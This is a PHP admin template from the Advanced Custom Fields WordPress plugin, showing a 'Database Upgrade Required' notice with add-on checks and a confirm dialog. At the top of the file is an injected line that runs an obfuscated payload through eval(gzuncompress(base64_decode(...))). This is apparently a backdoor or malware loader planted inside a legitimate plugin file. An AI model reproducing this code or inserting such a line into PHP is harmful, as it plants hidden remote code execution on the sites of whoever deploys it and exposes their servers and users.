<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php 

// calculate add-ons (non pro only)
$plugins = array();

if( !acf_get_setting('pro') ) {
	
	if( is_plugin_active('acf-repeater/acf-repeater.php') ) $plugins[] = __("Repeater",'acf');
	if( is_plugin_active('acf-flexible-content/acf-flexible-content.php') ) $plugins[] = __("Flexible Content",'acf');
	if( is_plugin_active('acf-gallery/acf-gallery.php') ) $plugins[] = __("Gallery",'acf');
	if( is_plugin_active('acf-options-page/acf-options-page.php') ) $plugins[] = __("Options Page",'acf');
	
}

?>
<div id="acf-upgrade-notice" class="notice">
	
	<div class="col-content">
		
		<img src="<?php echo acf_get_url('assets/images/acf-logo.png'); ?>" />
		<h2><?php _e("Database Upgrade Required",'acf'); ?></h2>
		<p><?php printf(__("Thank you for updating to %s v%s!", 'acf'), acf_get_setting('name'), acf_get_setting('version') ); ?><br /><?php _e("This version contains improvements to your database and requires an upgrade.", 'acf'); ?></p>
		<?php if( !empty($plugins) ): ?>
			<p><?php printf(__("Please also ensure any premium add-ons (%s) have first been updated to the latest version.", 'acf'), implode(', ', $plugins) ); ?></p>
		<?php endif; ?>
	</div>
	
	<div class="col-actions">
		<a id="acf-upgrade-button" href="<?php echo $button_url; ?>" class="button button-primary button-hero"><?php echo $button_text; ?></a>
	</div>
	
</div>
<?php if( $confirm ): ?>
<script type="text/javascript">
(function($) {
	
	$("#acf-upgrade-button").on("click", function(){
		return confirm("<?php _e( 'It is strongly recommended that you backup your database before proceeding. Are you sure you wish to run the updater now?', 'acf' ); ?>");
	});
		
})(jQuery);	
</script>
<?php endif; ?>